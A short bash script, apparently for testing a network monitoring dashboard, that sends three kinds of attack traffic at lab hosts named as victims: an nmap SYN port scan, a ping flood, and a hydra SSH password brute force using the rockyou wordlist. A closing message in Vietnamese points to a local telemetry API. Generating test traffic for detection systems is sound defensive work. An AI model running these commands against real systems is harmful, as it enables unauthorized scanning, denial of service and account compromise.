#!/bin/bash
echo "=== Site HQ: SYN Port Scan ==="
nmap -sS -p 1-100 victim-hq
sleep 8
echo "=== Site Server Farm: ICMP Flood ==="
ping -f -c 200 victim-serverfarm
sleep 8
echo "=== Site DMZ: SSH Brute Force ==="
timeout 60 hydra -l demo -P /usr/share/wordlists/rockyou.txt ssh://victim-dmz -t 4
echo "=== Xong, kiểm tra dashboard hoặc curl http://localhost:8000/api/v1/telemetry?limit=10 ==="
